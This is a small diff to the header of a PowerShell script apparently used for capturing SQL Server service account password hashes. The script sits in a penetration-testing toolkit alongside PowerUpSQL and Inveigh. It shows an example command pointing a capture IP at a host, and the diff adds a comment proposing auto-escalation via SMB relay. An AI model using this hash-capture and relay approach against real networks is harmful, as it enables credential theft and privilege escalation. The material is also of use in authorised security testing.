@@ -5,6 +5,7 @@
 # Example run as domain user: .\Get-SQLServiceAccountPwHash.ps1 -captureip 10.20.2.1 -verbose -timeout 10
 #import-module .\powerupsql.psm1
 #import-module .\inveigh.ps1
+#we could auto escalate if there way a powershell smb to smb relay - inveigh mod?
 
 [CmdletBinding()]
 Param(
